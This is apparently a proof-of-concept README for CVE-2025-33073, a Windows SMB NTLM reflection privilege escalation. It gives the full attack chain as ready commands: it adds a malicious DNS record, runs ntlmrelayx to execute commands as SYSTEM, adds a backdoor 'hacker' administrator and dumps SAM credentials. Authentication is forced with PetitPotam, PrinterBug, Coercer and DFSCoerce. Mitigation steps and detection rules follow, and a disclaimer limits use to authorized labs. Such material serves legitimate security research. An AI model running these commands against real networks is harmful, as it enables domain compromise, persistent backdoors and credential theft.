# CVE-2025-33073
Windows SMB Client Elevation of Privilege Vulnerability

# Description
The CVE-2025-33073 vulnerability exists in Windows SMB, allowing authenticated remote attackers to forcelocal authentication reflection on machines without enforced SMB signing by tampering with DNS records, ultimately executing arbitrary commands with SYSTEM privileges.

# Affected Versions
Windows 10 (all versions without KB5048685 or later updates)  
Windows 11 (all versions without KB5048685 or later updates)  
Windows Server 2016/2019/2022 (versions without latest January 2025 security updates)  
Windows Server 2025 (versions without KB5048685)

**Note**: Systems with SMB signing disabled are highly vulnerable.

# Environment Setup

| Role | OS | IP Address | Requirements |
|------|----|-----------|----|
| Domain Controller | Windows Server 2019/2022 | 192.168.214.134 | AD DS + DNS services |
| Target/Victim | Windows 10/11/Server | 192.168.214.135 | Domain-joined |
| Attacker | Kali Linux/Ubuntu | 192.168.214.129 | Penetration tools |

**Domain Configuration**:  
Domain regular user account: test.com\test1  
Password: Test..111  

# Usage

## Step 1: Add Malicious DNS Record
```bash
python3 dnstool.py -u 'luckytom.com\domainuser01' -p 'User01!@#' \
  -r evilhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
  -d 192.168.214.129 \
  --action add 192.168.214.134
```

**Parameters**:
- `-u`: Domain credentials (format: `DOMAIN\username`)
- `-p`: User password
- `-r`: DNS record name (prefix + fixed suffix `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`)
- `-d`: Attacker IP (where DNS record points)
- Last argument: DNS server IP (Domain Controller)

## Step 2: Start NTLM Relay Listener
```bash
# Basic command execution
sudo ntlmrelayx.py -t 192.168.214.135 -smb2support -c "whoami"

# Create backdoor admin user
sudo ntlmrelayx.py -t 192.168.214.135 -smb2support \
  -c "net user hacker Pass123! /add && net localgroup administrators hacker /add"

# Dump credentials
sudo ntlmrelayx.py -t 192.168.214.135 -smb2support --dump-sam
```

**Parameters**:
- `-t`: Target victim IP
- `-smb2support`: Enable SMB2 protocol support
- `-c`: Command to execute with SYSTEM privileges

## Step 3: Trigger Authentication (Coerce)
```bash
cd ~/PetitPotam
python3 PetitPotam.py -d luckytom.com -u domainuser01 -p 'User01!@#' \
  evilhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA@80/a.txt \
  192.168.214.135
```

**Alternative coercion methods**:
```bash
# Using PrinterBug
python3 printerbug.py luckytom.com/domainuser01:User01!@#@192.168.214.135 \
  evilhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA

# Using Coercer (multi-protocol)
python3 Coercer.py -u domainuser01 -p 'User01!@#' -d luckytom.com \
  -l 192.168.214.129 -t 192.168.214.135
```

# Demo

## Attack Flow Diagram
```
[Attacker] --1. Add DNS--> [Domain Controller DNS]
     |                            |
     |                            v
     +--2. Start ntlmrelayx       [Malicious DNS Record]
     |                            |
     +--3. Coerce Auth--> [Target] --4. Auth to Malicious DNS
     |                            |
     +<--5. Relay NTLM------<-----+
     |
     v
[Execute as SYSTEM on Target]
```

## Terminal Output Examples

**Terminal 1 - ntlmrelayx.py**:
```
[*] SMBD-Thread-3: Received connection from 192.168.214.135
[*] Authenticating against smb://192.168.214.135 as LUCKYTOM/WIN10$ SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Executed specified command on host: 192.168.214.135
nt authority\system  ← SYSTEM PRIVILEGES OBTAINED
```

**Terminal 2 - PetitPotam.py**:
```
[*] Attempting to coerce authentication from 192.168.214.135
[*] Using pipe: lsarpc
[*] Successfully triggered authentication!
```

## Screenshots
![DNS Record Addition](image.png)
*Successfully added malicious DNS record to Domain Controller*

![NTLM Relay Success](image-1.png)
*ntlmrelayx capturing and relaying authentication*

![SYSTEM Shell](image-2.png)
*Command execution with NT AUTHORITY\SYSTEM privileges*

# Root Cause Analysis

## Technical Details
The vulnerability exists in the Windows SMB client's authentication handling mechanism, specifically in how it validates reflected authentication attempts.

**Key Components**:
1. **DNS Spoofing Layer**: Windows resolves specially crafted DNS records without proper security zone validation
2. **Authentication Reflection**: SMB client accepts relayed authentication from itself when SMB signing is not enforced
3. **Privilege Context**: Relayed machine account authentication grants SYSTEM-level access

**Vulnerable Code Path**:
```
SMB Client Authentication Flow:
1. DNS Resolution (no zone check)
2. SMB Connection Initiation
3. NTLM/Kerberos Authentication
4. Token Validation (BYPASSED in CVE-2025-33073)
5. Service Access Granted (as SYSTEM)
```

**The Attack Vector**:
- Attacker adds DNS record with special suffix that triggers SMB client behavior
- Coercion tool forces target to authenticate to attacker-controlled name
- SMB client resolves malicious DNS, initiates authentication
- Attacker relays authentication back to victim machine
- Victim accepts its own relayed credentials and grants SYSTEM access

# Mitigation

## Immediate Actions
```powershell
# 1. Install Security Updates
Install-WindowsUpdate -KBArticleID KB5048685

# 2. Enforce SMB Signing (CRITICAL)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# 3. Verify Configuration
Get-SmbServerConfiguration | Select RequireSecuritySignature
Get-SmbClientConfiguration | Select RequireSecuritySignature

# 4. Disable NTLM (if possible)
# Group Policy: Computer Configuration > Windows Settings > Security Settings
# > Local Policies > Security Options
# Network security: LAN Manager authentication level
# Set to: "Send NTLMv2 response only. Refuse LM & NTLM"

# 5. Enable Extended Protection for Authentication
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
  -Name "EnableSecuritySignature" -Value 1

# 6. Disable Print Spooler (if not needed)
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

## Detection Queries

### Event Log Monitoring (Windows)
```powershell
# Detect unusual DNS queries with suspicious patterns
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DNS-Client/Operational'; ID=3008} |
  Where-Object {$_.Message -like '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA*'}

# Monitor for NTLM relay attempts
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4776} |
  Where-Object {$_.Properties[2].Value -eq $env:COMPUTERNAME}
```

### Network Detection (Defender/SIEM)
```
alert smb any any -> any any (msg:"Potential CVE-2025-33073 DNS Pattern"; 
  content:"1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"; 
  sid:2025033073; rev:1;)
```

# Troubleshooting

## Common Issues

**Issue 1: DNS Record Addition Failed**
```bash
# Solution: Verify domain user has DNS write permissions
# Or use account with higher privileges
ldapsearch -x -H ldap://192.168.214.134 -D "domainuser01@luckytom.com" \
  -W -b "DC=luckytom,DC=com" "(objectClass=dnsNode)"
```

**Issue 2: Port 445 Already in Use**
```bash
# Stop local SMB services
sudo systemctl stop smbd nmbd
# Or use different network interface
sudo ntlmrelayx.py -t 192.168.214.135 -smb2support -i eth1
```

**Issue 3: Target Has SMB Signing Enabled**
```powershell
# Check status (on target)
Get-SmbServerConfiguration | Select RequireSecuritySignature

# For testing only - disable temporarily
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
```

**Issue 4: Authentication Coercion Not Working**
```bash
# Try alternative tools
# 1. Coercer (supports multiple protocols)
python3 Coercer.py scan -t 192.168.214.135 -u domainuser01 -p 'User01!@#'

# 2. DFSCoerce
python3 dfscoerce.py -u domainuser01 -p 'User01!@#' -d luckytom.com \
  192.168.214.129 192.168.214.135
```

# References
- [CVE Record - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-33073)
- [Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [知乎保姆级复现教程](https://zhuanlan.zhihu.com/p/1918631282335811185)
- [腾讯云技术分析](https://cloud.tencent.com/developer/article/2549783)
- [Revelsi Security Analysis](https://www.revelsi.com/en/blog/cve-2025-33073-privilege-escalation-via-ntlm-reflection-in-windows-smb-client/)
- [Forestall Deep Dive](https://forestall.io/blog/en/active-directory/cve-2025-33073-a-new-technique-for-reflective-ntlm-relay-attack/)
- [Undercode Testing Exploitation Guide](https://undercodetesting.com/exploiting-cve-2025-33073-ntlm-reflection-attack-deep-dive/)
- [Wiz Vulnerability Database](https://www.wiz.io/vulnerability-database/cve/cve-2025-33073)

# Disclaimer
⚠️ **This proof-of-concept is provided for educational and authorized security research purposes only.**

- Only use in controlled lab environments with explicit permission
- Unauthorized testing against systems you don't own is illegal
- The authors are not responsible for misuse of this information
- Always follow responsible disclosure practices

# License
This project is provided as-is for educational purposes under MIT License.

---

**Last Updated**: February 2026  
**Status**: Patched in KB5048685 (January 2025)  
**CVSS Score**: 8.1 (High)  
**Attack Complexity**: Low  
**Privileges Required**: Low (domain user)  
**User Interaction**: None
